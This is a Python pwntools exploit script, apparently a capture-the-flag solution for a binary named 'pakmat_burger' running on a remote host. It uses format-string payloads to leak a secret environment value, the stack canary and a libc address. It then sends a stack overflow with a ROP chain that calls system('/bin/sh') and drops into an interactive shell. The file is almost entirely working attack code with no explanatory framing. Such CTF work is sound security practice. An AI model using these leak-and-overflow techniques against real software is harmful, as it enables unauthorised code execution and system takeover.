#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./pakmat_burger", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc 13.229.222.125 33170"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    elif args.REMOTE_LOCAL:
        return remote("localhost", 10001)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {
    "SECRET_MESSAGE": "deadbeef"
}

# for i in range(1, 64):
#     try:
#         with context.quiet:
#             io = start()
#         # fmt_payload = f"%{i}$s".encode()
#         fmt_payload = f"%{i}$lx".encode()
#         io.sendlineafter(b"name: ", fmt_payload)
#         io.recvuntil(b"Hi ")
#         leak = io.recvuntil(b", ", drop=True)
#         log.info(f"{i}: {leak}")
#         with context.quiet:
#             io.close()
#     except EOFError:
#         log.info(f"{i}: error")

if args.REMOTE_LOCAL:
    secret_offset = 54
elif args.REMOTE:
    secret_offset = 53
else:
    secret_offset = 51

canary_offset = 13
libc_offset = 3
pie_offset = 17

io = start()
io.sendlineafter(b"name: ", f"%{secret_offset}$s".encode())
io.recvuntil(b"Hi ")
SECRET_MESSAGE = io.recvuntil(b", ", drop=True).split(b"=")[-1]
log.info(f"{SECRET_MESSAGE=}")
io.close()

io = start()
payload = f"%{canary_offset}$lx%{libc_offset}$lx".encode()
print(len(payload))
io.sendlineafter(b"name: ", payload)
io.recvuntil(b"Hi ")
leak = io.recvuntil(b", ", drop=True).rjust(28, b"0")
# log.info(f"{leak=}")
canary = int(leak[:16], 16)
libc_leak = int(leak[16:], 16)
log.info(f"{canary=:#x}")
log.info(f"{libc_leak=:#x}")

libc.address = libc_leak - libc.sym["write"] - 23
log.info(f"{libc.address=:#x}")
io.sendlineafter(b"message: ", SECRET_MESSAGE)
io.sendlineafter(b"order? \n", b"idk")
writable = libc.address + 0x21b000
pop_rdi = libc.address + 0x001bc0a1
ret = pop_rdi + 1
payload = b"A" * (0x2d - 0x8)
payload += flat(
    canary,
    writable,
    pop_rdi, next(libc.search(b"/bin/sh\x00")),
    ret,
    libc.sym["system"]
)
io.sendlineafter(b"soon: ", payload)
io.interactive()
